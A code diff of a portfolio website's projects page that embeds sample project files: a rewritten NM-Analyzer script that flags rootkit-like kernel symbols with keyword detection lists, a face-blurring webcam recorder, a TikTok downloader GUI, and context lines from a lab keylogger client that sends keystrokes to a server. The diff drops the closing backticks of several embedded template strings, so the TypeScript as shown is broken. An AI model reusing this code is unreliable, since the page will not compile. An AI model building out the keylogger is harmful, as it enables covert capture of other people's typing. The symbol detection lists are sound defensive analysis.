@@ -21,10 +21,6 @@ export const Route = createFileRoute("/projects")({
   component: ProjectsPage,
 });
 
-/* ─────────────────────────────────────────────────────────────────
-   Project model
-   ───────────────────────────────────────────────────────────────── */
-
 type FileEntry = {
   name: string;
   lang: "md" | "py" | "js" | "bash" | "c" | "ino" | "txt";
@@ -42,10 +38,9 @@ type Project = {
   demo: string;
   image: string | null;
   files: FileEntry[];
-  /** terminal output simulated when "Run" pressed */
   runCommand: string;
   runOutput: string[];
-  vulnLines?: number[]; // line numbers to highlight in first .py/.c file
+  vulnLines?: number[];
 };
 
 const PROJECTS: Project[] = [
@@ -59,17 +54,26 @@ const PROJECTS: Project[] = [
     github: "",
     demo: "/assets/nm.mp4",
     image: "/assets/nm_analyzer.png",
-    runCommand: "$ python3 nm_analyzer.py rootkit.ko",
+    runCommand: "$ python3 NM-Analyzer.py rootkit.ko",
     runOutput: [
-      "[*] Loading ELF: rootkit.ko (12,304 bytes)",
-      "[*] Parsing symbol table (.symtab, .dynsym)...",
-      "[+] 87 symbols extracted",
-      "[!] HIGH   sys_call_table     → category: Syscall Hooking",
-      "[!] HIGH   commit_creds       → category: Privilege Escalation",
-      "[!] HIGH   prepare_kernel_cred→ category: Privilege Escalation",
-      "[!] MED    kallsyms_lookup    → category: Address Resolution",
-      "[*] Risk score: 87/100  (LIKELY MALICIOUS)",
-      "[*] Report written: report_rootkit.json",
+      "[*] Analyzing: rootkit.ko",
+      "[T]  87 symbols  Text (Global Code)",
+      "[t]  12 symbols  Text (Local Code)",
+      "[U]  34 symbols  Undefined (Imported)",
+      "[B]   8 symbols  BSS (Global Uninit)",
+      "",
+      "▶ Privilege Escalation (3)",
+      "  T  commit_creds",
+      "  T  prepare_kernel_cred",
+      "  U  setresuid",
+      "",
+      "▶ Syscall Hooking (2)",
+      "  T  sys_call_table",
+      "  U  ftrace_set_filter_ip",
+      "",
+      "Score: 10/10",
+      "Status: HIGH RISK - Potential Rootkit or Malicious Agent.",
+      "[+] Analysis complete. JSON report: nm_analysis.json",
     ],
     vulnLines: [22, 23, 35],
     files: [
@@ -92,7 +96,7 @@ and bins each symbol into risk categories.
 
 ## Usage
 \`\`\`
-python3 nm_analyzer.py module.ko
+python3 NM-Analyzer.py module.ko
 \`\`\`
 
 ## Status
@@ -100,51 +104,173 @@ Active · adding YARA-style rule packs next.
 `,
       },
       {
-        name: "nm_analyzer.py",
+        name: "NM-Analyzer.py",
         lang: "py",
-        content: `#!/usr/bin/env python3
-"""NM Analyzer — symbol-table heuristics for Linux Kernel Modules."""
-import sys, json
-from pathlib import Path
-from elftools.elf.elffile import ELFFile
+        content: `
+#!/usr/bin/env python3
+import subprocess
+import sys
+import json
+import os
+from collections import defaultdict
 
-CATEGORIES = {
-    "Syscall Hooking": [
-        "sys_call_table", "set_memory_rw", "set_memory_ro",
-        "ftrace_set_filter_ip",
-    ],
-    "Privilege Escalation": [
-        "commit_creds", "prepare_kernel_cred",
-    ],
-    "Hiding": [
-        "module_kobject", "kobject_del",
-    ],
+# --- Configuration & Aesthetics ---
+class Colors:
+    HEADER = '\\033[95m'
+    BLUE = '\\033[94m'
+    CYAN = '\\033[96m'
+    GREEN = '\\033[92m'
+    YELLOW = '\\033[93m'
+    RED = '\\033[91m'
+    BOLD = '\\033[1m'
+    UNDERLINE = '\\033[4m'
+    ENDC = '\\033[0m'
+
+# Expanded Keyword Dictionary for Kernel Malware Analysis
+KEYWORDS = {
+    "Privilege_Escalation": ["cred", "root", "commit", "prepare", "uid", "gid", "setresuid", "override_creds"],
+    "Syscall_Hooking": ["kill", "getdents", "syscall", "hook", "table", "wp_disable", "cr0", "ftrace", "kprobe"],
+    "Stealth_Persistence": ["hide", "invisible", "module", "obfuscate", "cloak", "unhash", "list_del", "notifier_chain"],
+    "Kernel_Interaction": ["task", "current", "kthread", "vm_area", "notify", "workqueue", "kobject"],
+    "Network_Operations": ["socket", "packet", "netif", "skb", "tcp", "udp", "dev_add_pack", "nf_register", "iptables"],
+    "File_Manipulation": ["vfs_", "file_operations", "read_iter", "write_iter", "lookup", "inode", "dentry"],
+    "Memory_Manipulation": ["mmap", "vmalloc", "kmem_cache", "page_alloc", "copy_from_user", "copy_to_user", "remap_pfn"],
+    "Security_Bypass": ["selinux", "apparmor", "capability", "audit", "lsm", "security_ops"],
+    "Encryption_Hashing": ["crypto_", "aes", "sha256", "md5", "des", "encrypt", "decrypt"]
 }
 
-def categorize(symbols):
-    findings = []
-    for sym in symbols:
-        for cat, keys in CATEGORIES.items():
-            if any(k in sym for k in keys):
-                # NOTE: high-confidence keyword match
-                findings.append((sym, cat, "HIGH"))
-    return findings
+def print_banner():
+    print(f"{Colors.BLUE}{Colors.BOLD}")
+    print(r"  _   _ __  __      _                _                      ")
+    print(r" | \\ | |  \\/  |    / \\   _ __   __ _| |_   _ _______ _ __   ")
+    print(r" |  \\| | |\\/| |   / _ \\ | '_ \\ / _\` | | | | |_  / _ \\ '__|  ")
+    print(r" | |\\  | |  | |  / ___ \\| | | | (_| | | |_| |/ /  __/ |     ")
+    print(r" |_| \\_|_|  |_| /_/   \\_\\_| |_|\\__,_|_|\\__, /___\\___|_|     ")
+    print(r"                                       |___/                ")
+    print(f"{Colors.ENDC}")
 
-def main(path):
-    with open(path, "rb") as f:
-        elf = ELFFile(f)
-        symtab = elf.get_section_by_name(".symtab")
-        names = [s.name for s in symtab.iter_symbols() if s.name]
-        findings = categorize(names)
-    score = min(100, len(findings) * 12)
-    print(f"[*] Risk score: {score}/100")
-    Path(f"report_{Path(path).stem}.json").write_text(
-        json.dumps({"findings": findings, "score": score}, indent=2)
-    )
+def analyze_binary(binary_path):
+    if not os.path.exists(binary_path):
+        print(f"{Colors.RED}[!] Error: File '{binary_path}' not found.{Colors.ENDC}")
+        sys.exit(1)
+
+    try:
+        output = subprocess.check_output(["nm", binary_path], text=True, stderr=subprocess.DEVNULL)
+    except subprocess.CalledProcessError:
+        print(f"{Colors.RED}[!] Error: 'nm' failed to process the binary.{Colors.ENDC}")
+        sys.exit(1)
+
+    symbols = []
+    by_type = defaultdict(list)
+    semantic = defaultdict(list)
+
+    for line in output.splitlines():
+        parts = line.split()
+        if len(parts) < 2: continue
+        
+        if len(parts) == 2:
+            addr, sym_type, name = "        ", parts[0], parts[1]
+        else:
+            addr, sym_type, name = parts[0], parts[1], parts[2]
+
+        entry = {"address": addr, "type": sym_type, "name": name}
+        symbols.append(entry)
+        by_type[sym_type].append(entry)
+
+        lname = name.lower()
+        for category, keys in KEYWORDS.items():
+            if any(k in lname for k in keys):
+                semantic[category].append(entry)
+
+    return symbols, by_type, semantic
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <kernel_module.ko>")
+        sys.exit(1)
+
+    binary = sys.argv[1]
+    print_banner()
+    print(f"{Colors.CYAN}Analyzing: {Colors.BOLD}{binary}{Colors.ENDC}\\n")
+
+    symbols, by_type, semantic = analyze_binary(binary)
+
+    # 1. Symbol Summary
+    print(f"{Colors.HEADER}{Colors.BOLD}─── SYMBOL TYPE SUMMARY ─────────────────────────────────{Colors.ENDC}")
+    sorted_types = sorted(by_type.items(), key=lambda x: len(x[1]), reverse=True)
+    for t, syms in sorted_types:
+        desc = {
+            'T': 'Text (Global Code)', 't': 'Text (Local Code)', 'U': 'Undefined (Imported)', 
+            'B': 'BSS (Global Uninit)', 'b': 'BSS (Local Uninit)', 'D': 'Data (Global Init)',
+            'd': 'Data (Local Init)', 'r': 'Read-Only (Constants)'
+        }.get(t, 'Unknown')
+        print(f"  {Colors.BOLD}[{t}]{Colors.ENDC} {len(syms):<4} symbols  {Colors.BLUE}({desc}){Colors.ENDC}")
+
+    # 2. Semantic Analysis
+    print(f"\\n{Colors.HEADER}{Colors.BOLD}─── SEMANTIC HEURISTICS ────────────────────────────────{Colors.ENDC}")
+    for cat, items in semantic.items():
+        count = len(items)
+        cat_color = Colors.RED if count > 0 else Colors.GREEN
+        print(f"\\n{cat_color}▶ {cat.replace('_', ' ')} ({count}){Colors.ENDC}")
+        for s in items:
+            # Highlight external imports and executable code
+            sym_color = Colors.YELLOW if s['type'] in ['T', 't'] else (Colors.CYAN if s['type'] == 'U' else Colors.ENDC)
+            print(f"  {Colors.BOLD}{s['type']:>2}{Colors.ENDC}  {sym_color}{s['name']}{Colors.ENDC}")
+
+    # 3. Risk Assessment (Weighted Logic)
+    risk_score = 0
+    findings = []
+    
+    weights = {
+        "Privilege_Escalation": 4,
+        "Syscall_Hooking": 4,
+        "Stealth_Persistence": 3,
+        "Security_Bypass": 3,
+        "Network_Operations": 2,
+        "Memory_Manipulation": 2,
+        "Encryption_Hashing": 1
+    }
+
+    for cat, weight in weights.items():
+        if semantic.get(cat):
+            risk_score += weight
+            findings.append(f"{cat.replace('_', ' ')} logic detected.")
+    
+    risk_score = min(risk_score, 10)
+
+    print(f"\\n{Colors.HEADER}{Colors.BOLD}─── RISK ASSESSMENT ────────────────────────────────────{Colors.ENDC}")
+    score_color = Colors.GREEN if risk_score < 4 else (Colors.YELLOW if risk_score < 7 else Colors.RED)
+    
+    print(f"  Score: {score_color}{Colors.BOLD}{risk_score}/10{Colors.ENDC}")
+    
+    if risk_score >= 7:
+        print(f"  {Colors.RED}{Colors.BOLD}Status: HIGH RISK - Potential Rootkit or Malicious Agent.{Colors.ENDC}")
+    elif risk_score >= 4:
+        print(f"  {Colors.YELLOW}Status: MEDIUM RISK - Suspicious capability overlap.{Colors.ENDC}")
+    else:
+        print(f"  {Colors.GREEN}Status: LOW RISK - Standard or benign module activity.{Colors.ENDC}")
+
+    # 4. JSON Export
+    report = {
+        "target": binary,
+        "metrics": {
+            "total_symbols": len(symbols),
+            "risk_score": risk_score,
+            "findings": findings
+        },
+        "symbol_counts": {k: len(v) for k, v in by_type.items()},
+        "detections": {k: [s["name"] for s in v] for k, v in semantic.items()}
+    }
+
+    output_file = "nm_analysis.json"
+    with open(output_file, "w") as f:
+        json.dump(report, f, indent=4)
+    
+    print(f"\\n{Colors.CYAN}[+] Analysis complete. JSON report: {Colors.BOLD}{output_file}{Colors.ENDC}")
 
 if __name__ == "__main__":
-    main(sys.argv[1])
-`,
+    main()
+,
       },
       {
         name: "rules.json",
@@ -529,7 +655,8 @@ can be extracted from raw input streams. **Lab-only.**
       {
         name: "keylogger.py",
         lang: "py",
-        content: `#!/usr/bin/env python3
+        content: `
+#!/usr/bin/env python3
 """Keylogger client — sends keystroke telemetry to server"""
 import keyboard, json, requests, threading, time
 from datetime import datetime
@@ -560,7 +687,7 @@ keyboard.on_press(on_key)
 threading.Timer(5.0, flush).start()
 print("[*] Keylogger active — press Ctrl+C to stop")
 keyboard.wait()
-`,
+,
       },
       {
         name: "server.py",
@@ -735,6 +862,153 @@ if __name__ == "__main__":
     ],
   },
   {
+    id: "faceblur",
+    name: "FaceBlur Live",
+    domain: "ai",
+    status: "active",
+    tags: ["computer-vision", "opencv", "real-time", "mediapipe"],
+    description: "Real-time computer vision app detecting and blurring faces in live video streams with audio recording.",
+    github: "",
+    demo: "/assets/livefaceblur.mp4",
+    image: "/assets/livefaceblur.png",
+    runCommand: "$ python3 face-blur.py",
+    runOutput: [
+      "🎙️ Recording audio...",
+      "🎥 Recording video... Press 'q' to stop.",
+      "🎙️ Processing audio...",
+      "📦 Merging video + audio...",
+      "✅ Done! Output saved to final_output.mp4",
+    ],
+    files: [
+      {
+        name: "README.md",
+        lang: "md",
+        content: `# FaceBlur Live
+
+Real-time face detection + dynamic blurring on live webcam feed with audio recording.
+
+## How
+- MediaPipe face detection (fast, accurate)
+- Per-frame mosaic blur over detected ROIs
+- Simultaneous audio recording via sounddevice
+- FFmpeg merge for final output
+
+## Requirements
+- opencv-python
+- mediapipe
+- sounddevice
+- soundfile
+- ffmpeg
+`,
+      },
+      {
+        name: "face-blur.py",
+        lang: "py",
+        content: `
+import cv2
+import mediapipe as mp
+import numpy as np
+import sounddevice as sd
+import soundfile as sf
+import threading
+import subprocess
+import os
+import shutil
+
+# إعداد mediapipe
+mp_face = mp.solutions.face_detection
+detector = mp_face.FaceDetection(model_selection=0, min_detection_confidence=0.5)
+
+# مسارات الإخراج
+video_file = "raw_video.avi"
+audio_file = "raw_audio.wav"
+final_file = "final_output.mp4"
+
+# إعداد الفيديو
+cap = cv2.VideoCapture(0)
+fourcc = cv2.VideoWriter_fourcc(*"XVID")
+out = cv2.VideoWriter(video_file, fourcc, 20.0, (640, 480))
+
+# إعداد الصوت
+audio_sr = 44100
+audio_data = []
+
+def record_audio():
+    global audio_data
+    print("🎙️ Recording audio...")
+    audio_data = sd.rec(int(60 * audio_sr), samplerate=audio_sr, channels=1, dtype="float32")
+    sd.wait()
+
+def apply_mosaic(frame, x, y, w, h, block_size=20):
+    face = frame[y:y+h, x:x+w]
+    if face.size == 0:
+        return frame
+    small = cv2.resize(face, (w//block_size, h//block_size), interpolation=cv2.INTER_LINEAR)
+    mosaic = cv2.resize(small, (w, h), interpolation=cv2.INTER_NEAREST)
+    frame[y:y+h, x:x+w] = mosaic
+    return frame
+
+# بدء تسجيل الصوت في Thread منفصل
+audio_thread = threading.Thread(target=record_audio, daemon=True)
+audio_thread.start()
+
+print("🎥 Recording video... Press 'q' to stop.")
+
+while True:
+    ret, frame = cap.read()
+    if not ret:
+        break
+
+    rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+    results = detector.process(rgb)
+
+    if results.detections:
+        for det in results.detections:
+            box = det.location_data.relative_bounding_box
+            h, w, _ = frame.shape
+            x1 = int(box.xmin * w)
+            y1 = int(box.ymin * h)
+            bw = int(box.width * w)
+            bh = int(box.height * h)
+
+            # ضمان الحدود
+            x1, y1 = max(0, x1), max(0, y1)
+            bw, bh = min(bw, w - x1), min(bh, h - y1)
+
+            frame = apply_mosaic(frame, x1, y1, bw, bh, block_size=15)
+
+    out.write(frame)
+    cv2.imshow("Anonymous Blur Recorder", frame)
+
+    if cv2.waitKey(1) & 0xFF == ord("q"):
+        break
+
+cap.release()
+out.release()
+cv2.destroyAllWindows()
+
+# حفظ الصوت
+print("🎙️ Processing audio...")
+sf.write(audio_file, audio_data, audio_sr)
+
+anon_audio = "anon_audio.wav"
+shutil.copy(audio_file, anon_audio)
+
+
+# دمج الصوت بالفيديو
+print("📦 Merging video + audio...")
+subprocess.run([
+    r"C:\\Users\\mosta\\Downloads\\ffmpeg-8.0-essentials_build\\ffmpeg-8.0-essentials_build\\bin\\ffmpeg.exe",
+    "-y", "-i", video_file, "-i", anon_audio,
+    "-c:v", "libx264", "-c:a", "aac", "-shortest", final_file
+])
+
+print(f"✅ Done! Output saved to {final_file}")
+,
+      },
+    ],
+  },
+  {
     id: "vehicle",
     name: "Smart Recon Vehicle",
     domain: "embedded",
@@ -806,91 +1080,6 @@ void loop() {
     Serial.println(c);
   }
 }
-`,
-      },
-    ],
-  },
-  {
-    id: "faceblur",
-    name: "FaceBlur Live",
-    domain: "ai",
-    status: "active",
-    tags: ["computer-vision", "opencv", "real-time"],
-    description: "Real-time computer vision app detecting and blurring faces in live video streams.",
-    github: "",
-    demo: "/assets/livefaceblur.mp4",
-    image: "/assets/livefaceblur.png",
-    runCommand: "$ python3 faceblur_live.py",
-    runOutput: [
-      "[*] Loading Haar cascade: haarcascade_frontalface_default.xml",
-      "[*] Capture device: /dev/video0  (1280x720)",
-      "[+] Stream started — 28 fps",
-      "[+] Face detected (124,88,210,210)  → blurred",
-      "[+] Face detected (442,102,200,200) → blurred",
-      "[*] Press q to stop",
-    ],
-    files: [
-      {
-        name: "README.md",
-        lang: "md",
-        content: `# FaceBlur Live
-
-Real-time face detection + dynamic blurring on live webcam feed.
-
-## How
-- Haar cascades (fast, CPU-only)
-- Per-frame Gaussian blur over detected ROIs
-- Optional: switch to DNN backend for accuracy
-`,
-      },
-      {
-        name: "faceblur_live.py",
-        lang: "py",
-        content: `import cv2
-
-cascade = cv2.CascadeClassifier(cv2.data.haarcascades + "haarcascade_frontalface_default.xml")
-cap = cv2.VideoCapture(0)
-
-while True:
-    ok, frame = cap.read()
-    if not ok: break
-    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
-    faces = cascade.detectMultiScale(gray, 1.2, 5)
-    for (x, y, w, h) in faces:
-        roi = frame[y:y+h, x:x+w]
-        frame[y:y+h, x:x+w] = cv2.GaussianBlur(roi, (45, 45), 30)
-    cv2.imshow("FaceBlur Live", frame)
-    if cv2.waitKey(1) & 0xFF == ord("q"): break
-
-cap.release(); cv2.destroyAllWindows()
-`,
-      },
-    ],
-  },
-  {
-    id: "tiktok",
-    name: "TikTok Media Downloader",
-    domain: "ai",
-    status: "archived",
-    tags: ["http", "scraper", "python"],
-    description: "Lightweight tool for downloading TikTok videos without watermarks or ads.",
-    github: "",
-    demo: "/assets/tiktok.mp4",
-    image: "/assets/tiktok.png",
-    runCommand: "$ python3 tk_dl.py https://tiktok.com/@x/video/123",
-    runOutput: [
-      "[*] Resolving URL ...",
-      "[+] Found stream: video_no_wm.mp4 (4.1 MB)",
-      "[+] Downloaded → ./out/123.mp4",
-    ],
-    files: [
-      {
-        name: "README.md",
-        lang: "md",
-        content: `# TikTok Media Downloader
-
-Minimal CLI to fetch a TikTok clip without watermark / ad overlay.
-Pure HTTP — no Selenium.
 `,
       },
     ],
@@ -975,6 +1164,327 @@ Designed by Karnaugh-map minimization to be hazard-free.
     ],
   },
   {
+    id: "tiktok",
+    name: "TikTok Media Downloader",
+    domain: "ai",
+    status: "archived",
+    tags: ["http", "scraper", "python", "gui"],
+    description: "Professional GUI tool for downloading TikTok videos without watermarks, with thumbnail preview and audio extraction.",
+    github: "",
+    demo: "/assets/tiktok.mp4",
+    image: "/assets/tiktok.png",
+    runCommand: "$ python3 tiktok_downloader_pro.py",
+    runOutput: [
+      "[*] Launching TikTok Video Downloader Pro...",
+      "[*] API endpoint: https://www.tikwm.com/api/",
+      "[+] GUI initialized",
+      "[*] Ready to fetch and download...",
+    ],
+    files: [
+      {
+        name: "README.md",
+        lang: "md",
+        content: `# TikTok Media Downloader Pro
+
+Professional GUI for downloading TikTok videos without watermark or ads.
+
+## Features
+- Modern customtkinter GUI with dynamic sizing
+- Thumbnail preview with auto-resize
+- Video info display (author, duration, likes, views)
+- No-watermark download option
+- Audio-only extraction
+- Progress bar with real-time status
+
+## Stack
+- customtkinter (modern tkinter)
+- Pillow (image handling)
+- requests (API calls)
+- tikwm.com API
+`,
+      },
+      {
+        name: "tiktok_downloader_pro.py",
+        lang: "py",
+        content: `
+#!/usr/bin/env python3
+"""
+TikTok Video Downloader Pro (Personal Use)
+-------------------------------------------
+Ultimate GUI version: Modern theme, thumbnail preview, video info, audio download, and more.
+Updated: Fully dynamic sizing—window starts at natural size based on content, expands/resizes fluidly.
+Fixed: Removed problematic self.geometry("") to prevent TypeError; now relies purely on Tkinter's natural sizing.
+Thumbnail resize now safely defaults to 200x200 if widget dimensions are invalid during early layout.
+"""
+
+import requests
+import os
+import sys
+import customtkinter as ctk
+from tkinter import messagebox, filedialog
+from pathlib import Path
+import threading
+import re
+from PIL import Image, ImageTk
+import io
+
+ctk.set_appearance_mode("System")  # "dark", "light", or "system"
+ctk.set_default_color_theme("blue")
+
+API_ENDPOINT = "https://www.tikwm.com/api/"
+
+class TikTokDownloader(ctk.CTk):
+    def __init__(self):
+        super().__init__()
+        self.title("TikTok Video Downloader Pro 🔥")
+        # No fixed geometry—window will size dynamically based on content
+        self.minsize(500, 400)  # Minimum size for usability
+        self.grid_rowconfigure(0, weight=1)
+        self.grid_columnconfigure(0, weight=1)
+
+        # Variables
+        self.url_var = ctk.StringVar()
+        self.output_var = ctk.StringVar(value=os.getcwd())
+        self.no_watermark_var = ctk.BooleanVar(value=True)
+        self.thumbnail_img = None
+        self.video_info = {}
+
+        self.setup_ui()
+        # Ensure widgets are laid out for natural sizing
+        self.update_idletasks()
+        # Removed self.geometry("") to avoid TypeError
+
+    def setup_ui(self):
+        # Main frame with expanded padding for better scaling
+        main_frame = ctk.CTkFrame(self)
+        main_frame.grid(row=0, column=0, sticky="nsew", padx=20, pady=20)
+        main_frame.grid_rowconfigure(6, weight=1)  # Let preview frame expand vertically
+        main_frame.grid_columnconfigure(0, weight=1)  # Let main column expand horizontally
+
+        # Title (centered, non-expanding)
+        title_label = ctk.CTkLabel(main_frame, text="TikTok Video Downloader Pro", font=ctk.CTkFont(size=24, weight="bold"))
+        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 20), sticky="ew")
+
+        # URL Input row—make it expand horizontally
+        ctk.CTkLabel(main_frame, text="Enter TikTok Video URL:", font=ctk.CTkFont(size=14)).grid(row=1, column=0, sticky="w", pady=5)
+        url_entry = ctk.CTkEntry(main_frame, textvariable=self.url_var, height=40, font=ctk.CTkFont(size=12))
+        url_entry.grid(row=2, column=0, columnspan=2, pady=5, sticky="ew")
+
+        # Fetch Button (right-aligned, fixed width)
+        fetch_btn = ctk.CTkButton(main_frame, text="Fetch Info & Preview", font=ctk.CTkFont(size=12, weight="bold"),
+                                  command=self.start_fetch, width=150, height=35)
+        fetch_btn.grid(row=2, column=2, padx=(10, 0), pady=5, sticky="e")
+
+        # Output Directory row—expanding
+        ctk.CTkLabel(main_frame, text="Output Directory:", font=ctk.CTkFont(size=14)).grid(row=3, column=0, sticky="w", pady=(20,5))
+        output_frame = ctk.CTkFrame(main_frame)
+        output_frame.grid(row=4, column=0, columnspan=3, pady=5, sticky="ew")
+        output_frame.grid_columnconfigure(0, weight=1)  # Entry expands
+        ctk.CTkEntry(output_frame, textvariable=self.output_var, state="readonly").pack(side="left", fill="x", expand=True, padx=(0,10))
+        ctk.CTkButton(output_frame, text="Choose Folder", command=self.choose_output_dir, width=100).pack(side="right")
+
+        # Download Options (non-expanding)
+        options_frame = ctk.CTkFrame(main_frame)
+        options_frame.grid(row=5, column=0, columnspan=3, pady=10, sticky="ew")
+        ctk.CTkCheckBox(options_frame, text="No Watermark (Recommended)", variable=self.no_watermark_var, command=self.toggle_watermark).pack(side="left", padx=10, pady=10)
+
+        # Thumbnail & Info Panel—expands vertically and horizontally
+        preview_frame = ctk.CTkFrame(main_frame)
+        preview_frame.grid(row=6, column=0, columnspan=3, pady=10, sticky="nsew")
+        preview_frame.grid_rowconfigure(0, weight=1)
+        preview_frame.grid_columnconfigure(0, weight=1)
+        self.thumbnail_label = ctk.CTkLabel(preview_frame, text="Preview will appear here after fetching info", fg_color="transparent")
+        self.thumbnail_label.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
+        self.info_label = ctk.CTkLabel(preview_frame, text="Video info will show here", font=ctk.CTkFont(size=12), anchor="w")
+        self.info_label.grid(row=1, column=0, sticky="ew", padx=10, pady=(0,10))
+
+        # Progress Bar—expands horizontally
+        self.progress = ctk.CTkProgressBar(main_frame)
+        self.progress.grid(row=7, column=0, columnspan=3, pady=10, sticky="ew")
+        self.progress.set(0)
+
+        # Status Label (expanding)
+        self.status_label = ctk.CTkLabel(main_frame, text="Ready to fetch and download...", font=ctk.CTkFont(size=12), anchor="w")
+        self.status_label.grid(row=8, column=0, columnspan=3, pady=5, sticky="ew")
+
+        # Buttons frame—expanding
+        button_frame = ctk.CTkFrame(main_frame)
+        button_frame.grid(row=9, column=0, columnspan=3, pady=20, sticky="ew")
+        button_frame.grid_columnconfigure(1, weight=1)  # Space between buttons
+        self.download_btn = ctk.CTkButton(button_frame, text="Download Video 🚀", font=ctk.CTkFont(size=16, weight="bold"),
+                                         command=self.start_download, width=150, height=40)
+        self.download_btn.grid(row=0, column=0, padx=(0, 20))
+        self.audio_btn = ctk.CTkButton(button_frame, text="Download Audio 🎵", font=ctk.CTkFont(size=16, weight="bold"),
+                                       command=self.start_audio_download, width=150, height=40, state="disabled")
+        self.audio_btn.grid(row=0, column=2)
+
+        # Bind Enter to fetch
+        url_entry.bind("<Return>", lambda e: self.start_fetch())
+
+    def choose_output_dir(self):
+        dir_path = filedialog.askdirectory(initialdir=self.output_var.get())
+        if dir_path:
+            self.output_var.set(dir_path)
+
+    def clean_filename(self, filename: str, max_length: int = 100) -> str:
+        cleaned = re.sub(r'[<>:"/\\\\|?*]', '', filename)
+        if len(cleaned) > max_length:
+            cleaned = cleaned[:max_length]
+        return cleaned.strip() or "tiktok_item"
+
+    def fetch_video_info(self, url: str):
+        try:
+            self.status_label.configure(text="Verifying URL and fetching info...")
+            self.progress.start()  # Indeterminate for fetch
+            self.download_btn.configure(state="disabled")
+            self.audio_btn.configure(state="disabled")
+
+            api_url = f"{API_ENDPOINT}?url={url}"
+            r = requests.get(api_url, timeout=10)
+            r.raise_for_status()
+            data = r.json()
+
+            if data.get("code") != 0 or "data" not in data:
+                raise ValueError("Invalid response: Could not fetch video data.")
+
+            self.video_info = data["data"]
+            self.update_preview()
+            self.audio_btn.configure(state="normal")
+            self.download_btn.configure(state="normal")
+            return True
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to fetch video info: {e}")
+            self.reset_ui()
+            return False
+        finally:
+            self.progress.stop()
+            self.progress.set(0)
+
+    def update_preview(self):
+        # Show thumbnail (resizes dynamically if widget is fully laid out)
+        cover_url = self.video_info.get("cover")
+        if cover_url:
+            try:
+                resp = requests.get(cover_url, timeout=5)
+                img = Image.open(io.BytesIO(resp.content))
+                # Get current label dimensions safely
+                self.update_idletasks()  # Ensure latest layout
+                label_width = self.thumbnail_label.winfo_width()
+                label_height = self.thumbnail_label.winfo_height()
+                if label_width <= 1 or label_height <= 1:  # Fallback if not yet rendered
+                    size = (200, 200)
+                else:
+                    thumb_size = min(label_width - 20, label_height - 20, 300)  # Cap at 300 for large windows
+                    size = (thumb_size, thumb_size)
+                img = img.resize(size, Image.Resampling.LANCZOS)
+                self.thumbnail_img = ImageTk.PhotoImage(img)
+                self.thumbnail_label.configure(image=self.thumbnail_img, text="")
+            except Exception as e:
+                print(f"Thumbnail load error: {e}")  # Silent fallback
+                self.thumbnail_label.configure(text="Thumbnail unavailable")
+
+        # Show info (multi-line, wraps if needed)
+        info = self.video_info
+        author = info.get("author", {}).get("nickname", "Unknown")
+        duration = info.get("duration", 0)
+        likes = info.get("digg_count", 0)
+        views = info.get("play_count", 0)
+        title = info.get("title", "No title")
+        info_text = f"Author: {author}\\nDuration: {duration}s | Likes: {likes:,} | Views: {views:,}\\nTitle: {title}"
+        self.info_label.configure(text=info_text)
+        self.status_label.configure(text="Ready to download! ✅")
+
+    def reset_ui(self):
+        self.thumbnail_label.configure(image="", text="Preview will appear here after fetching info")
+        self.info_label.configure(text="Video info will show here")
+        self.audio_btn.configure(state="disabled")
+        self.download_btn.configure(state="normal")
+        self.progress.set(0)
+        self.status_label.configure(text="Ready to fetch and download...")
+
+    def toggle_watermark(self):
+        pass  # UI toggle only
+
+    def download_file(self, file_url: str, out_path: Path, is_audio: bool = False):
+        try:
+            self.status_label.configure(text="Downloading..." if not is_audio else "Downloading audio...")
+            with requests.get(file_url, stream=True) as resp:
+                resp.raise_for_status()
+                total = int(resp.headers.get("Content-Length", 0))
+                downloaded = 0
+                chunk_size = 8192
+
+                with open(out_path, "wb") as f:
+                    for chunk in resp.iter_content(chunk_size=chunk_size):
+                        if chunk:
+                            f.write(chunk)
+                            downloaded += len(chunk)
+                            if total:
+                                percent = (downloaded / total) * 100
+                                self.progress.set(percent)
+                                self.status_label.configure(text=f"Downloading... {percent:.1f}%")
+
+            self.progress.set(100)
+            self.status_label.configure(text="Download complete! ✅")
+            return out_path
+        except Exception as e:
+            raise RuntimeError(f"Download failed: {e}")
+
+    def start_fetch(self):
+        url = self.url_var.get().strip()
+        if not url:
+            messagebox.showerror("Error", "Please enter a valid URL.")
+            return
+        threading.Thread(target=self.fetch_video_info, args=(url,), daemon=True).start()
+
+    def start_download(self):
+        if not self.video_info:
+            messagebox.showwarning("Info Needed", "Please fetch video info first by clicking 'Fetch Info & Preview'.")
+            return
+        video_url = self.video_info["play"] if self.no_watermark_var.get() else self.video_info.get("wmplay", self.video_info["play"])
+        self._download_thread(video_url, "mp4", "Video")
+
+    def start_audio_download(self):
+        if not self.video_info:
+            messagebox.showwarning("Info Needed", "Please fetch video info first.")
+            return
+        music_url = self.video_info.get("music") or self.video_info.get("music_url", "")
+        if not music_url:
+            messagebox.showerror("Error", "Audio URL not available for this video.")
+            return
+        self._download_thread(music_url, "mp3", "Audio")
+
+    def _download_thread(self, file_url: str, ext: str, name: str):
+        url = self.url_var.get().strip()
+        out_dir = Path(self.output_var.get())
+        title = self.video_info.get("title", "tiktok_item")
+        safe_name = self.clean_filename(title)
+        out_path = out_dir / f"{safe_name}.{ext}"
+
+        def download():
+            try:
+                saved_file = self.download_file(file_url, out_path, name.lower() == "audio")
+                messagebox.showinfo("Success!", f"{name} saved to:\\n{saved_file.absolute()}")
+                if messagebox.askyesno("Open Folder?", f"Open the output folder for the {name.lower()}?"):
+                    if sys.platform == "win32":
+                        os.startfile(out_dir.absolute())
+                    else:
+                        os.system(f"open '{out_dir.absolute()}'" if sys.platform == "darwin" else f"xdg-open '{out_dir.absolute()}'")
+                self.reset_ui()  # Auto-reset for next use
+            except Exception as e:
+                messagebox.showerror("Error", str(e))
+            finally:
+                self.progress.set(0)
+
+        threading.Thread(target=download, daemon=True).start()
+
+if __name__ == "__main__":
+    app = TikTokDownloader()
+    app.mainloop(),
+      },
+    ],
+  },
+  {
     id: "butterworth",
     name: "3rd-Order Butterworth BPF",
     domain: "embedded",
@@ -1027,10 +1537,6 @@ const FILE_ICON = (lang: FileEntry["lang"]) => {
   return FileCode2;
 };
 
-/* ─────────────────────────────────────────────────────────────────
-   Tiny syntax highlighter — token-class based, no deps
-   ───────────────────────────────────────────────────────────────── */
-
 const KEYWORDS: Record<FileEntry["lang"], string[]> = {
